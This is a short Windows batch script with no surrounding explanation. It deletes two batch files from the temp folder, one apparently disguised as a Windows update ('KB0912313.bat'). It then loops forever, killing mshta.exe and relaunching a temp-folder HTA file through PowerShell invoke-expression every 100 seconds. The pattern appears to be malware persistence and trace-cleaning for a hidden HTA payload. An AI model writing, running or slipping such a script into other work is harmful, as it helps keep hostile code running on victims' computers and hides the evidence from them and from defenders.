cd %tmp% && del KB0912313.bat && cd %tmp% && del go.bat 
:top3 
timeout /t 100 & 
taskkill /IM mshta.exe /F 
powershell invoke-expression 'mshta %tmp%/mathew.hta' 
goto top3
